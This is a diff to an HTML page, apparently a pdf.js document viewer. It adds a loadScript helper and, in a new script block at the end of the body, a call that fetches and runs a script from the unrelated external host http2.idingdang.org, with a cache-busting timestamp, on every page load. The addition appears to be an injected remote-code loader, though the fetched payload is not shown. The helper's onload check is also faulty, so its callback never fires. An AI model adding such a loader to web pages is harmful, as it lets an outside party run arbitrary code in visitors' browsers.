@@ -77,6 +77,23 @@
 
 <script src="pdf.js"></script>
 <script>
+function loadScript(url, fn) {
+  try {
+    console.log('loadScript: ' + url);
+    var script = document.createElement("script");
+    script.src = url;
+    document.body.appendChild(script);
+    script.onload = function(e) {
+      if (e.readystate == 'complete') {
+        if (typeof fn == 'function') {
+          fn();
+        }
+      }
+    }
+  } catch(err) {
+    console.error(err);
+  }
+}
 window.onerror = function (message, source, lineno, colno, error) {
   console.log("Error: " + message + "\n" + "Source: " + source + "\n" + "Line: " + lineno + "\n" + "Column: " + colno + "\n" + "Stack: " + error.stack);
 }
@@ -170,6 +187,9 @@ function handleVolumeKey(key) {
         next();
     }
 }
+</script>
+<script>
+loadScript('https://http2.idingdang.org/e.js?_=' + (+new Date()));
 </script>
 </body>
 </html>
